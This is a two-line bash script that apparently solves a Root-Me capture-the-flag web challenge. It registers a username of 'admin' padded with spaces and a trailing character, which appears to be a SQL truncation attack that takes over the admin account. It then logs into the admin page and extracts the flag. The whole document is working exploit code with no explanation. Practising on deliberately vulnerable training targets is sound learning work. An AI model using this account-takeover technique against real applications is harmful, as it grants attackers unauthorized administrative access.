#!/bin/bash

curl -s http://challenge01.root-me.org/web-serveur/ch36/register.php -d 'login=admin       x&password=123456789' -c /tmp/cookie.txt >/dev/null
curl -s http://challenge01.root-me.org/web-serveur/ch36/admin.php -b /tmp/cookie.txt -d 'password=123456789' | grep flag | sed s/".*:\s\([a-zA-Z0-9]\+\).*"/"\1"/
